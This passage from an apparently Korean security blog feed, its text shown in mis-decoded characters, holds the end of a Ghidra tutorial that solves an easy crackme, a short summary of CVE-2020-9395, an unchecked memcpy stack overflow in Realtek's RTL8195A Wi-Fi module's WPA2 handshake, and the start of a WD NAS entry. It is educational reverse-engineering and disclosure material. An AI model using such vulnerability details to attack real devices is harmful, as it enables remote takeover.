íƒìƒ‰ì „</h1><p>ì œê°€ Windows ë¨¸ì‹ ì„ ì‚¬ìš©í•˜ë¯€ë¡œ Windows ê¸°ì¤€ìœ¼ë¡œ ì§„í–‰ë©ë‹ˆë‹¤. Linuxì™€ MacOSì—ì„œë„ ì‹¤í–‰ ë°©ì‹ì˜ ì°¨ì´ë§Œ ì¡´ì¬í•  ë¿, ì°¨ì´ê°€ ì—†ìœ¼ë‹ˆ ê±±ì • ì•ˆ í•˜ì…”ë„ ë©ë‹ˆë‹¤! ì´ ê²Œì‹œê¸€ì—ì„œ ì‚¬ìš©í•œ ì˜ˆì œ íŒŒì¼ì€ <a href="https://crackmes.one/crackme/6004daf233c5d42c3d016717">ì—¬ê¸°</a>ì—ì„œ ë‹¤ìš´ë¡œë“œí•˜ì‹¤ ìˆ˜ ìˆìŠµë‹ˆë‹¤.(ì••ì¶• íŒŒì¼ì˜ ë¹„ë°€ë²ˆí˜¸ëŠ” <code>crackmes.one</code>ì…ë‹ˆë‹¤.)</p><p>ë¨¼ì € <code>ghidraRun.bat</code>ì´ë‚˜ <code>ghidraRun.sh</code>ì„ í†µí•´ ghidraë¥¼ ì‹¤í–‰í•˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ í”„ë¡œì íŠ¸ ì°½ì´ ëœ¹ë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%204.png"></p><p>í”„ë¡œì íŠ¸ ì°½ì—ì„œëŠ” í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•˜ê³  ë°”ì´ë„ˆë¦¬ë¥¼ ë¡œë“œ, êµ¬ì„±í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìƒˆ í”„ë¡œì íŠ¸ë¥¼ ë§Œë“  í›„ ë°”ì´ë„ˆë¦¬ë¥¼ ë“œë˜ê·¸ ì•¤ ë“œë¡­ì„ í•˜ì—¬ ì¶”ê°€ë¥¼ í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%205.png"></p><p>File - New Project (Ctrl+N)ì„ í†µí•´ ìƒˆë¡œìš´ í”„ë¡œì íŠ¸ë¥¼ ìƒì„±í•˜ê³  ìœ„ì—ì„œ ë‹¤ìš´ë¡œë“œí•œ ì˜ˆì œ íŒŒì¼ì„ ë“œë˜ê·¸ ì•¤ ë“œë¡­í•˜ê±°ë‚˜ Import Fileì„ í†µí•´ ì¶”ê°€í•˜ì—¬ ì¤ë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%206.png"></p><p>ë°”ì´ë„ˆë¦¬ importê°€ ì™„ë£Œë˜ë©´, Import Summary ì°½ì„ í†µí•´ ê°„ëµí•œ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. í•´ë‹¹ ì •ë³´ì—ì„œ ì»´íŒŒì¼ëŸ¬, Compiler ID ë“±ë“±ì„ í†µí•´ ëŒ€ëµì ì¸ ë°”ì´ë„ˆë¦¬ì— ëŒ€í•œ ì •ë³´ë¥¼ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.(ì•…ì„±ì½”ë“œ ë¶„ì„ì„ í•  ë•Œ ì¢‹ê² ë„¤ìš”.)</p><p>ì´ì œ í”„ë¡œì íŠ¸ ì°½ì—ì„œ crackme.exeë¥¼ ë”ë¸”í´ë¦­í•˜ë©´ ë“œë˜ê³¤(!) ì• ë‹ˆë©”ì´ì…˜ì´ ëœ¨ê³  ë¶„ì„ì„ ì§„í–‰í•˜ê² ëƒê³  ë¬»ëŠ” ì°½ì´ ëœ¹ë‹ˆë‹¤. ë‹¹ì—°íˆ Yesë¥¼ í´ë¦­í•´ì¤ë‹ˆë‹¤!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%207.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%208.png"></p><p>Yesë¥¼ í´ë¦­í•˜ë©´ ghidraì—ì„œ ê°€ëŠ¥í•œ ë¶„ì„ ì˜µì…˜ì„ ë³´ì—¬ì¤ë‹ˆë‹¤. ê°œë³„ì ì¸ ì„¸íŒ…ì€ ë¬´ì‹œí•˜ê³  ê¸°ë³¸ ê°’ì„ ê·¸ëŒ€ë¡œ ì‚¬ìš©í•˜ì…”ë„ í° ë¬¸ì œëŠ” ì—†ìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%209.png"></p><p>ë¶„ì„ì´ ì™„ë£Œë˜ê³  ë‚œ í›„ ë©”ì¸ í™”ë©´ì€ ìœ„ì™€ ê°™ìŠµë‹ˆë‹¤. ì´ì œ ë©”ì¸ í™”ë©´ì— ê° ì„¹ì…˜ì´ ì–´ë– í•œ ê¸°ëŠ¥ì„ í•˜ëŠ”ì§€ ì‚´í´ë´…ì‹œë‹¤!</p><h2 id="Program-amp-Symbol-Trees-Data-Type-Manager"><a href="#Program-amp-Symbol-Trees-Data-Type-Manager" class="headerlink" title="Program &amp; Symbol Trees, Data Type Manager"></a>Program &amp; Symbol Trees, Data Type Manager</h2><h3 id="Program-Trees"><a href="#Program-Trees" class="headerlink" title="Program Trees"></a>Program Trees</h3><p>Program Treesë¥¼ í™œìš©í•˜ë©´ ì›í•˜ëŠ” ì„¹ì…˜ìœ¼ë¡œ íŠ¸ë¦¬ë¥¼ ë‚˜ëˆŒ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2010.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2011.png"></p><blockquote><p>Dominanceë¥¼ í†µí•´ êµ¬ì„±ëœ ì½”ë“œ ì„¹ì…˜ ì˜ˆì‹œ</p></blockquote><h3 id="Symbol-Tree"><a href="#Symbol-Tree" class="headerlink" title="Symbol Tree"></a>Symbol Tree</h3><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2012.png"></p><p>Symbol Treeì˜ ê²½ìš° Import ëœ DLL, Exports ëœ í•¨ìˆ˜ ë“±ë“±ì˜ ì •ë³´ë¥¼ ì œê³µí•©ë‹ˆë‹¤. íŠ¹ì • í•¨ìˆ˜ê°€ ì–´ë””ì—ì„œ ì°¸ì¡°ë˜ëŠ”ì§€ í™•ì¸í•  ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2013.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2014.png"></p><h3 id="Data-Type-Manager"><a href="#Data-Type-Manager" class="headerlink" title="Data Type Manager"></a>Data Type Manager</h3><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2015.png"></p><p>Data Type Managerì—ì„œëŠ” ê¸°ë³¸ì ìœ¼ë¡œ ì œê³µë˜ê±°ë‚˜, ë°”ì´ë„ˆë¦¬ì—ì„œ ì œê³µí•˜ëŠ” ë°ì´í„° íƒ€ì…ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°ì´í„° íƒ€ì…ì„ ìš°í´ë¦­í•˜ê³  â€œFind Uses ofâ€(<code>Ctrl + Shift + F</code>)ë¥¼ í´ë¦­í•˜ì—¬ í•´ë‹¹ ë°”ì´ë„ˆë¦¬ ë‚´ì—ì„œ ë°ì´í„° ìœ í˜•ì´ ì‚¬ìš©ë˜ëŠ” ê³³ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2016.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2017.png"></p><h2 id="Disassembly-View-amp-Function-Graph"><a href="#Disassembly-View-amp-Function-Graph" class="headerlink" title="Disassembly View &amp; Function Graph"></a>Disassembly View &amp; Function Graph</h2><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2018.png"></p><p>ì¤‘ì•™ì— í° í™”ë©´ì€ ë””ìŠ¤ ì–´ì…ˆë¸” ëœ ì½”ë“œë¥¼ í™•ì¸í•  ìˆ˜ ìˆëŠ” ì°½ì…ë‹ˆë‹¤. ì—¬ëŸ¬ í•„ë“œê°€ ì¡´ì¬í•˜ê³ , ì–´ë–¤ ë¶€ë¶„ì— ë¬´ì—‡ì´ í‘œì‹œë ì§€ ë“± ëª¨ë‘ ì‚¬ìš©ìê°€ ì»¤ìŠ¤í„°ë§ˆì´ì§• í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>ìƒë‹¨ í‘œì‹œì¤„ì— ì¡´ì¬í•˜ëŠ” â€œEdit the Listing filedsâ€ë¥¼ í´ë¦­í•˜ê³  â€œInstruction/Dataâ€ë¥¼ í´ë¦­í•˜ë©´ ìˆ˜ì •ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤. í¬ê¸° ì¡°ì •, ìœ„ì¹˜ ì´ë™, ë¹„í™œì„±í™”, ìƒˆë¡œìš´ ê¸°ëŠ¥ ì¶”ê°€ ë“± ë‹¤ì–‘í•˜ê²Œ ì»¤ìŠ¤í„°ë§ˆì´ì§• í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2019.png"></p><p>IDAì—ì„œ í•¨ìˆ˜ ì´ë¦„ì„ ìˆ˜ì •í•  ìˆ˜ ìˆëŠ” ê²ƒì²˜ëŸ¼ ghidraì—ì„œëŠ” <code>L</code> ë‹¨ì¶•í‚¤ë¥¼ ì´ìš©í•˜ì—¬ í•¨ìˆ˜ì˜ ì´ë¦„ì„ ìˆ˜ì •í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2020.png"></p><p>ë˜í•œ í•¨ìˆ˜ì˜ ì´ë™ ì—†ì´ í•´ë‹¹ í•¨ìˆ˜ê°€ ì–´ë– í•œ ì½”ë“œë¡œ ë˜ì–´ìˆëŠ”ì§€ í™•ì¸í•˜ê³  ì‹¶ìœ¼ë©´ í•¨ìˆ˜ ì´ë¦„ì— ë§ˆìš°ìŠ¤ ì»¤ì„œë¥¼ ì˜¬ë ¤ë†“ê³  ê¸°ë‹¤ë¦¬ë©´ í•´ë‹¹ ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2021.png"></p><p>ì›í•˜ëŠ” ë¶€ë¶„ ìš°í´ë¦­-Comments- ì›í•˜ëŠ” Commentë¥¼ í†µí•´ ì£¼ì„ë„ ì¶”ê°€ê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. <code>;</code> ë‹¨ì¶•í‚¤ë¥¼ ì‚¬ìš©í•˜ì—¬ ì›í•˜ëŠ” ë¶€ë¶„ì— ë°”ë¡œ ì£¼ì„ì„ ë‹¬ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2022.png"></p><blockquote><p><code>;</code>ë¥¼ ëˆŒë €ì„ ë•Œ ë‚˜ì˜¤ëŠ” ì°½. í•´ë‹¹ ì°½ì— ì£¼ì„ì„ ì…ë ¥í•˜ê³  â€˜OKâ€™ë¥¼ ëˆ„ë¥´ë©´ ëœë‹¤.</p></blockquote><p>IDA Proë¥¼ ì‚¬ìš©í•  ë•Œ ê°€ì¥ í¸í–ˆë˜ ê¸°ëŠ¥ ì¤‘ í•˜ë‚˜ê°€ ê·¸ë˜í”„ ëª¨ë“œì˜€ì£ ? ghidraì—ì„œëŠ” ë””ìŠ¤ ì–´ì…ˆë¸” ì°½ì—ì„œ ë°”ë¡œ ê·¸ë˜í”„ ë·°ë¥¼ í™•ì¸í•  ìˆœ ì—†ì§€ë§Œ â€œWindowsâ€ - â€œFunction Graphâ€ë¥¼ í†µí•´ ê·¸ë˜í”„ ë·°ë¥¼ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2023.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2024.png"></p><blockquote><p>ghidraì—ì„œ ì œê³µí•˜ëŠ” function graph. IDA Proì™€ í° ì°¨ì´ê°€ ë‚˜ì§„ ì•ŠëŠ”ë‹¤.</p></blockquote><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2025.png"></p><p>Function Graph ë˜í•œ ë””ìŠ¤ ì–´ì…ˆë¸” ì°½ê³¼ ë§ˆì°¬ê°€ì§€ë¡œ í‘œì‹œë˜ëŠ” ë‚´ìš©ì„ ì»¤ìŠ¤í„°ë§ˆì´ì§• í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ìš°ì¸¡ ìƒë‹¨ì˜ â€œEdit Code Block Filedsâ€ë¥¼ í´ë¦­í•œ í›„ â€œInstruction/Dataâ€ì—ì„œ ì•„ë¬´ ê³µê°„ì´ë‚˜ ìš°í´ë¦­-Add Fieldë¡œ ì›í•˜ëŠ” ì½”ë“œ ë¸”ë¡ì„ ì¶”ê°€í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Decompiler"><a href="#Decompiler" class="headerlink" title="Decompiler"></a>Decompiler</h2><p>ì´ì œ IDA Proì˜ hex-rays ê¸°ëŠ¥ì— í•´ë‹¹í•˜ëŠ” ë””ì»´íŒŒì¼ëŸ¬ ì°½ì…ë‹ˆë‹¤. ê¸°ë³¸ì ìœ¼ë¡œ ë””ìŠ¤ ì–´ì…ˆë¸”ëŸ¬ ì°½ ìš°ì¸¡ì— ìœ„ì¹˜í•˜ë©°, í¬ê¸°ë¥¼ ì¡°ì •í•  ìˆ˜ ìˆê³  ìœ„ì¹˜ ì¡°ì • ë˜í•œ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2026.png"></p><p>í•¨ìˆ˜ ë‚´ë¶€ë¥¼ í´ë¦­í•˜ë©´ ìë™ìœ¼ë¡œ í•¨ìˆ˜ ë‚´ìš©ì´ ë””ì»´íŒŒì¼ ë¼ì„œ ìš°ì¸¡ ë””ì»´íŒŒì¼ ì°½ì— í‘œì‹œë©ë‹ˆë‹¤. ìœ„ì˜ ì‚¬ì§„ì²˜ëŸ¼ Function Graphë¥¼ ëŒì–´ë‹¤ ë„£ì–´ì„œ ë””ìŠ¤ ì–´ì…ˆë¸” ì°½ì´ ì•„ë‹Œ Function Graph ì°½ì´ ì¢Œì¸¡ì— í‘œì‹œë˜ê²Œ ì»¤ìŠ¤í„°ë§ˆì´ì§•ë„ í•  ìˆ˜ ìˆì£ !</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2027.png"></p><p>ìœ„ì—ì„œ ì„¤ëª…ë“œë¦° ê²ƒê³¼ ë§ˆì°¬ê°€ì§€ë¡œ ë””ì»´íŒŒì¼ëŸ¬ ì°½ì—ì„œë„ ë³€ìˆ˜ë‚˜ í•¨ìˆ˜ì˜ ì´ë¦„ì„ ìˆ˜ì •í•  ìˆ˜ ìˆê³  ì£¼ì„ì„ ë‹¬ ìˆ˜ë„ ìˆìŠµë‹ˆë‹¤. ë””ì»´íŒŒì¼ëŸ¬ ì°½ì—ì„œ ìˆ˜ì •í•œ ë‚´ìš©ì€ ë””ìŠ¤ ì–´ì…ˆë¸” ì°½ì—ë„ ì ìš©ì´ ë˜ê³ , ë””ìŠ¤ ì–´ì…ˆë¸” ì°½ì—ì„œ ìˆ˜ì •í•œ ë‚´ìš©ë„ ë””ì»´íŒŒì¼ëŸ¬ ì°½ì— ì ìš©ì´ ë©ë‹ˆë‹¤.</p><h2 id="Crackmeë¥¼-í’€ì–´ë³´ì"><a href="#Crackmeë¥¼-í’€ì–´ë³´ì" class="headerlink" title="Crackmeë¥¼ í’€ì–´ë³´ì!"></a>Crackmeë¥¼ í’€ì–´ë³´ì!</h2><p>ì´ì œ ghidraì˜ ëŒ€ëµì ì¸ ê¸°ëŠ¥ë„ í™•ì¸ì„ í•´ë³´ì•˜ìœ¼ë‹ˆ Crackmeë¥¼ í’€ì–´ë³¼ ìˆ˜ ìˆì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤. ì¼ë‹¨ íŒŒì¼ì„ ì‹¤í–‰í•´ì„œ ì–´ë– í•œ ë…€ì„ì¸ì§€ í™•ì¸ì„ í•´ë´…ì‹œë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2028.png"></p><p>ë§ëŠ” Input ê°’ì„ ì°¾ì•„ì•¼ í•˜ëŠ” ë¬¸ì œêµ°ìš”.(<del>Crackmeë‹ˆê¹Œâ€¦ ë‹¹ì—°í•˜ê² ì§€</del>) ghidraë¥¼ í™•ì¸í•´ì„œ ë§ëŠ” inputì´ ë¬´ì—‡ì¸ì§€ ì°¾ì•„ë³´ë„ë¡ í•©ì‹œë‹¤!</p><p>ghidraë¥¼ ì‹¤í–‰í•œ í›„ Project ìƒì„± í›„ ë°”ì´ë„ˆë¦¬ë¥¼ ì¶”ê°€í•˜ê³ , ë¶„ì„ê¹Œì§€ ì™„ë£Œí•œ í™”ë©´ì—ì„œ main í™”ë©´ì„ ì°¾ì•„ë´…ì‹œë‹¤. String ê²€ìƒ‰ì„ í†µí•´ ì°¾ì„ ìˆ˜ë„ ìˆì§€ë§Œ(ê·¸ê²Œ ë” ê°„ë‹¨í•˜ì§€ë§Œ), Symbol Treeë¥¼ í†µí•´ ì°¾ì•„ë´…ì‹œë‹¤. ì¢Œì¸¡ Symbol Treeì—ì„œ Function ì˜† + ë²„íŠ¼ì„ ëˆŒëŸ¬ í´ë”ë¥¼ ì—´ì–´ì¤ë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2029.png"></p><p><code>___main</code>ì´ ì¡´ì¬í•˜ëŠ” ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë°‘ìœ¼ë¡œ ë” ìŠ¤í¬ë¡¤í•´ì„œ ë‹¤ë¥¸ í•¨ìˆ˜ë¥¼ í™•ì¸í•´ë³´ë©´</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2030.png"></p><p><code>_main</code>ê³¼ <code>_mainCRTStartup</code>ì´ ì¡´ì¬í•˜ëŠ” ê±¸ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. Entry Pointì¸ <code>_mainCRTStartup</code>ì„ í†µí•´ ì–´ë–¤ ê²Œ ì²˜ìŒ ì‹œì‘ë˜ëŠ” main í•¨ìˆ˜ì¸ì§€ í™•ì¸í•´ë´…ì‹œë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2031.png"></p><p><code>_mainCRTStartup</code>ì˜ ë‚´ìš©ì„ í™•ì¸í•´ë³´ë‹ˆ <code>___mingw_CRTStartup</code> í•¨ìˆ˜ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. í•´ë‹¹ í•¨ìˆ˜ë„ íƒìƒ‰ì„ í•´ë³¼ê¹Œìš”? ë”ë¸”í´ë¦­ì„ í•˜ë©´ í•´ë‹¹ í•¨ìˆ˜ë¡œ ì´ë™í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2032.png"></p><p><code>___main</code> í•¨ìˆ˜ì™€ <code>_main</code> í•¨ìˆ˜ë¥¼ ì°¨ë¡€ëŒ€ë¡œ ì‹¤í–‰ì„ í•©ë‹ˆë‹¤. ìœ„ì— í•¨ìˆ˜ë¶€í„° ë“¤ì–´ê°€ ë´…ì‹œë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2033.png"></p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2034.png"></p><p>ìŒâ€¦ ì‹¤í–‰í–ˆì„ ë•Œ ë‚˜ì˜¤ëŠ” ë¬¸ìì—´ì„ ì¶œë ¥í•˜ëŠ” ë¶€ë¶„ì´ ì—†ëŠ” ê±¸ ë³´ì•„ <code>_main</code>ì´ ì§„ì§œ ë©”ì¸ í•¨ìˆ˜ì¸ ê²ƒ ê°™ë„¤ìš”. ë’¤ë¡œ ê°€ê±°ë‚˜ ì•ìœ¼ë¡œ ê°€ëŠ” ê²ƒì€ ì¢Œì¸¡ ìƒë‹¨ì˜ ë²„íŠ¼ì„ ì‚¬ìš©í•˜ê±°ë‚˜ <code>ALT + ì¢Œìš° ë°©í–¥í‚¤</code>ë¥¼ ì‚¬ìš©í•˜ì‹œë©´ ë©ë‹ˆë‹¤.</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2035.png"></p><p><code>_main</code>ìœ¼ë¡œ ì˜¤ë‹ˆ ìœ„ì—ì„œ í™•ì¸í–ˆë˜ ë¬¸ìì—´ë„ ì¶œë ¥ë˜ê³ , ì…ë ¥ ê°’ê³¼ ë¹„êµí•˜ëŠ” ë¶€ë¶„ë„ ìˆë„¤ìš”. ì•„ë¬´ë˜ë„ ë‚œì´ë„ 1ì§œë¦¬ ê°„ë‹¨í•œ ë¬¸ì œì´ë‹¤ ë³´ë‹ˆ ë°”ë¡œ í’€ë ¤ë²„ë¦½ë‹ˆë‹¤ã…‹ã…‹ã…‹. ë­ ghidraë¥¼ ì–´ë–»ê²Œ ì‚¬ìš©í•˜ëŠ”ì§€ì— ëŒ€í•´ì„œ ì„¤ëª…í•˜ë ¤ê³  ê°€ì ¸ì˜¨ ë¬¸ì œë‹ˆê¹Œ! <code>0x1232b14 = 19082004</code>ì´ë¯€ë¡œ ì…ë ¥ì„ í•´ì£¼ë©´â€¦</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2036.png"></p><p>ì •ë‹µì„ì„ ì•Œ ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h1 id="ë§ˆì¹˜ë©°â€¦"><a href="#ë§ˆì¹˜ë©°â€¦" class="headerlink" title="ë§ˆì¹˜ë©°â€¦"></a>ë§ˆì¹˜ë©°â€¦</h1><p>ì˜¤ëŠ˜ì€ ê°„ë‹¨í•˜ê²Œ ghidraë€ ë¬´ì—‡ì¸ì§€, IDAë‘ ë¹„êµí–ˆì„ ë•Œ ì–´ë– í•œ ì°¨ì´ì ì´ ìˆëŠ”ì§€, ghidraëŠ” ì–´ë– í•œ ê¸°ëŠ¥ë“¤ì„ ê°€ì§€ê³  ìˆëŠ”ì§€ì— ëŒ€í•´ Easy Crackmeë¥¼ í’€ì–´ë³´ë©° ê°„ë‹¨íˆ ì‚´í´ë³´ì•˜ìŠµë‹ˆë‹¤.</p><p>Part 2ì—ì„œëŠ” ì˜¤ëŠ˜ ê°„ë‹¨í•˜ê²Œ ì§šê³  ë„˜ì–´ê°„ Data, Function, Scriptsì— ëŒ€í•´ì„œ ì¢€ ë” ë‹¤ë¤„ë³¼ ì˜ˆì •ì…ë‹ˆë‹¤. êµ­ë‚´ì—ëŠ” ì•„ì§ IDA Pro ì‚¬ìš©ìê°€ ë§ì§€ë§Œ ghidraë¥¼ ì‚¬ìš©í•´ë³´ê³  ì‹¶ìœ¼ì‹  ë¶„ë“¤ì´ ê³„ì‹œë‹¤ê±°ë‚˜, IDA Proë¥¼ ì ‘í•˜ê¸° í˜ë“¤ì–´ì„œ ghidraë¥¼ ì¨ë³´ê³  ì‹¶ì€ë° ì˜ ëª¨ë¥´ê² ë‹¤ í•˜ì‹œëŠ” ë¶„ë“¤ì—ê²Œ í° ë„ì›€ì´ ëìœ¼ë©´ í•˜ë©°â€¦</p><p>ì˜ëª»ëœ ì„¤ëª…ì´ë‚˜, ë¶€ì¡±í•œ ë¶€ë¶„ì´ ìˆë‹¤ë©´ ì–¸ì œë“  ëŒ“ê¸€ë¡œ ë‚¨ê²¨ì£¼ì‹œë©´ ë°˜ì˜í•˜ê³  ìˆ˜ì •í•˜ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤. ê·¸ëŸ¼ ë‹¤ë“¤ ì¢‹ì€ ë°¤ ë³´ë‚´ì„¸ìš”~! ì €ëŠ” ì´ì œ ìëŸ¬ ê°€ ë³´ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤!</p><p><img src="/2021/02/07/idioth/ghidra_part1/Untitled%2037.png"></p><p><del>ë°¤ì— ê¹¨ì–´ìˆê³  ë‚®ì— ìëŠ” ë±€íŒŒì´ì–´ ê°™ì€ ëª¨ìˆœì ì¸ ì‚¶â€¦</del></p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://dannyquist.github.io/gootkit-reversing-ghidra/">https://dannyquist.github.io/gootkit-reversing-ghidra/</a></p><p><a href="https://www.shogunlab.com/blog/2019/04/12/here-be-dragons-ghidra-0.html">https://www.shogunlab.com/blog/2019/04/12/here-be-dragons-ghidra-0.html</a></p><p><a href="https://ghidra.re/online-courses/">https://ghidra.re/online-courses/</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>crackme</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-9395: Realtek&#39;s Wi-Fi module remote root access</title>
    <link href="/2021/02/06/fabu1ous/2021-02-06/"/>
    <url>/2021/02/06/fabu1ous/2021-02-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://www.vdoo.com/blog/realtek-rtl8195a-vulnerabilities-discovered">Major Vulnerabilities discovered and patched in Realtek RTL8195A Wi-Fi Module</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Realtekâ€™s RTL8195A Wi-Fi module </p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Vdooê°€ Realtek RTL8195A Wi-Fi ëª¨ë“ˆì—ì„œ ë°œìƒí•˜ëŠ” ì·¨ì•½ì (CVE-2020-9395)ì˜ ì„¸ë¶€ ì •ë³´ë¥¼ ê³µê°œí–ˆìŠµë‹ˆë‹¤. RTL8195AëŠ” ì„ë² ë””ë“œ ì¥ë¹„ìš© low-power Wi-Fi ëª¨ë“ˆë¡œ WPA2 handshake ë™ì‘ì— stack overflow, out-of-bound read ì·¨ì•½ì ì´ ì¡´ì¬í•©ë‹ˆë‹¤. í•´ì»¤ëŠ” ì·¨ì•½ì ì„ í†µí•´ ì›ê²©ìœ¼ë¡œ ëª¨ë“ˆì˜ rootë¥¼ íƒˆì·¨í•  ìˆ˜ ìˆê³  ì´ ëª¨ë“ˆì´ íƒ‘ì¬ëœ ì„ë² ë””ë“œ ì¥ë¹„ì˜ ëª¨ë“  ë¬´ì„  í†µì‹ ì„ ì¡°ì‘í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.</p><p>WPA2 handshakeì˜ EAPOL-Key êµí™˜ ì‘ì—… ì¤‘ ClientëŠ” <code>ClientEAPOLKeyRecvd()</code>ë¥¼ ServerëŠ” <code>EAPOLKeyRecvd()</code>ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ë‘ í•¨ìˆ˜ ëª¨ë‘ <code>CheckMIC()</code>ë¥¼ í˜¸ì¶œí•´ EAP íŒ¨í‚·ì˜ MICì— ëŒ€í•œ ë¬´ê²°ì„± ê²€ì¦ì„ ì§„í–‰í•©ë‹ˆë‹¤. </p><pre><code class="hljs c">rtl_memcpy(tmpbuf, EAPOLMsgRecvd.Octet, EAPOLMsgRecvd.Length);</code></pre><p><code>ChckMIC()</code>ì—ëŠ” unsafe copyë¥¼ í•˜ëŠ” ì½”ë“œê°€ ì¡´ì¬í•©ë‹ˆë‹¤. tmpbufì˜ í¬ê¸°ëŠ” 512 bytesë¡œ ê³ ì •ë˜ì–´ ìˆì§€ë§Œ <code>EAPOLMsgRecvd.Octet</code>ì™€ <code>EAPOLMsgRecvd.Length</code> ëª¨ë‘ í•´ì»¤ê°€ ì•„ë¬´ ì œì•½ ì—†ì´ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(attack-controlled). NX-bit, ASLR, Canary ë“± ë³´í˜¸ ê¸°ë²•ì´ ì¡´ì¬í•˜ì§€ ì•Šì•„ tmpbuf ë³´ë‹¤ í° ì‚¬ì´ì¦ˆì˜ ì¡°ì‘ëœ packetì„ í†µí•´ <code>CheckMIC()</code>ì˜ ë¦¬í„´ ì£¼ì†Œë¥¼ ì¡°ì‘í•´ RCE ë˜ëŠ” DoS ë“±ì˜ ê³µê²©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>wifi</tag>
      
      <tag>embedded</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Stack-based buffer overflow RCE in WD NAS</title>
    <link href="/2021/02/05/l0ch/2021-02-05/"/>
    <url>/2021/02/05/l0ch/2021-02-05/</url>
    
